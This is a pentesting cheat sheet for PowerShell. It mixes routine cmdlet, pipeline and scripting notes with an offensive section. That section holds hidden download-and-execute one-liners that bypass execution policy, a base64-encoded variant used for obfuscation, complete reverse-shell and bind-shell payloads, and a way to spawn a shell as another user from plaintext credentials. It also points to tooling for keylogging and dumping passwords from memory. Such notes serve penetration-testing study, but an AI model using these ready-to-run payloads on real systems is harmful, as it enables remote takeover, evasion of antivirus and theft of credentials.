PowerShell For Pentesting:
=========================
Basics:
	Why use it for pentesting?
		Powershell scripts can run in MEMORY
		Almost never trigers AV
		Utilizes .NET framework classes
		Can be used to manage AD
		Remotely executes Powershell scripts
		We can also inject DLLs into process
		It also allows to use victims current windows cached credentials to access the DOMAIN.
	.ps1 => powershell script extension
	pse => powershell scrpting environment
Commands:(General)
	cmdlet: 
		verb:noun
		output:(object form)
			Members of output:
				Methods(functions)
				properties(variables/columns)
		examples of verbs:
			Get
			Start
			Stop 
			Read
			Write
			New
			Out
		examples of cmdlets:
			Get-Command => show commands
			Get-Location => show current working directory
			Directory:
				gci -force => same as ls -la
				gci -rec => recursive
			Get-Childitem => show files/folders
				-Path C:\
				-Path C:\, D:\Folder1
				-Recurse
				-Include *.ABCD* => '.ABCD' in name 
				-Exclude *.ABCD* => '.ABCD' not in name
				-Force => to see into HIDDEN folders
				-ErrorAction SilentlyContinue => some folders require special privileges to open, so then can give error, this flag is used to not show such errors
			get-content:
				to print data inside a file
				same as: type/cat
			Get-FileHash:
				-Algorithm <algorithm name>
					MD5
					SHA1
					SHA256 (default)
					SHA384
					SHA512
				use with Format-list
			Get-Help <command name>
			Get-Help <command name> -Examples
			update-help => update help_database
	combining commands: (command1 | command2)
		'|' passes the ouput from command1 as an input to command2
		examples of command2:
			Get-Member:
				Get-Command | Get-Member -MemberType Method # to find members of a command
			Select-Object:
				to select from the object
				Get-Childitem | Select-Object -Property Mode,Name
				Mode,Name => name of properties/columns
				flags:
					-unique 
					-last x
					-first x
					-skip x
			Where-Object:
				to filter based on the value of properties
				Verb-Noun | Where-Object -Property PropertyName -operator_name value
				Verb-Noun | Where-Object {$_.PropertyName -operator Value}
					$_ operator iterates through every object passed to Where-Object
				Operators:
				    -Contains: if any item in the property value is an exact match for the specified value
	   				-EQ: if the property value is the same as the specified value
	    			-GT: if the property value is greater than the specified value
	    			-MATCH: if the property value is a STRING
	    			Example:
	    				-EQ abcd
	    	Select-String:
	    		looks for string inside files
	    		-pattern API_KEY
	    	Sort-Object:
	    	Measure-Object: it measures lines
	    	Format-list: show like a list, rather than a borderless table
	    		alias: fl
	    		fl obj1,obj2 => format list to show only specific objects
	To base64 decode:
		certutil -decode "b64.txt" decode.txt
	User Enumeration:
		Get-LocalUser => show users
			-Name username | select * => show all info about a user
			-SID "sid_value" => find user having the given SID
		Get-LocalGroup	
	Network Enmeration:
		Get-NetIPAddress
		GEt-NetTCPConnection => ports listening
	System Enumeration:
		Get-Hotfix => patches installed
			-id hotfix_id
		Get-Process
		Get-ScheduleTask 
			-TaskName task
	service management:
		get-services
		get-wmiobject win32-service
		net stop service_name 
		stop-service service
		start-service service
		restart-service service
	process management:
		get-process => shows all process running
	environment variables:
		$psversiontable => shows version of powershell
	Downloading:
		powershell -c (New-Object Net.WebClient).DownloadFile('http://ip/filename', 'savename')
		powershell IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename')
Powershell Scripting:(.ps1)
	Uses PowerShell ISE
	comments:
		# Single line comments start with a number symbol.
		<#
		  Multi-line comments
		  like so
		#>
	Input:
		$userInput = Read-Host "Enter some data: "
	Output:
		Write-Output "I'm Posh. Nice to meet you!"
	variables:
		$variable_name = Value
		$variable_name = Get-NetTCPConnection -State Listen
	strings:
		'string'
		"string"
	operators:
		$TRUE
		$FALSE
		! => NOT
		-and => and
		-or => or
		Conditionals:
			-eq => equal
			-ne => not equal
			-gt => greater than
			-ge => greater than or equal
			-lt => lower than
			-le => lower than or equal
			-like => Returns true when string matches wildcard pattern
			-notlike => Returns true when string dont match wildcard pattern
			-contains => Returns true when reference value contained in a collection
			-notcontains
			-in => Returns true when test value contained in a collection
			-notin
	loops:
		foreach:
			foreach($new_var in $existing_var){}
		for:
			for($i=0;$i -le $value; $i++){}
		while:
			while($i -ne $value){}
	Conditionals:
		if($var1 operator $var2/value){}
		elseif(){}
		else{}
PowerShell From CMD:
	cmd> cmd.exe /c "powershell <options>"
		options:
			-c <command>
	cmd> powershell.exe <options>
		options:
			-ExecutionPolicy Bypass:(or -Exec Bypass)
				By defaull, PS has an execution policy to not run PS commands, by using this option, we bypass this policy.
			-NonI:(Non-Interactive Mode)
				PS doesnt represent an interactive prompt to the user
			-NoP:(or -NoProfile)
				Enforces PS to not load the current user profile
			-noexit:
				Do not exit the shell after execution. This is important for scripts like keyloggers, so that they continually run
			-W Hidden:
				helps in staying hidden
	32-bit vs 64-bit PS:
		32-bit PS:
			powershell.exe -NoP -NonI -W Hidden -Exec Bypass
		64-bit PS:
			%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass
Important Commands:
	1. powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('<url for .ps1 script>');[Parameters]
		Parameters:
			suppose our script is invoke-reverseshell.ps1, then:
			Invoke-Reverseshell -Lhost <> -Lport<> 
		Used to download and remotely execute scripts
	2. powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "& {Import-Module [path of .ps1 script];[Parameters]}"
		Used when we have script present locally
	3. powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc [Base64 code of script]
		we use base64 code for:
			Obfuscation of code
			Compacting the code
	4. switching user:(3 commands)
		we dont have "su" in windows, so switching user can be a bit tough, so we excute Invoke-PowershellTcp.ps1 as the user, whom we want to log in
		$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
			it creates a variable storing pass
		$cred = New-Object System.Management.Automation.PSCredential('username',$pass)
			it creates a username-pass pair
		Start-Process -FilePath "powershell" -ArgumentList "http://ip/Invoke-PowershellTcp.ps1" -Credential $cred
			it will run a command on behalf of user_name using $cred
	5. Reverse shell:(connecting to a listener port)
		powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + 'PS ' + pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"
	6. Bind Shell:(listening on a port)
		powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
Easy-P:(github.com/cheetz/Easy-P)
	a tool for getting PS commands for different categories:
		PrivEsc
		Lateral Movement
		Keylogging
		PowerShell Meterpreter
		Change users Execution policy
		Powershell 101
		Base64 Encode a PowerShell script
		mimikitaz- passwords from memory
	it provides 4 types of PS command for each category:
		1.To Download and execute
		2.Run a local copy of script
		3.Base64 ecoded version of download and execute
		4.A msfconsole.rc file(for Meterpreter PowerShell script)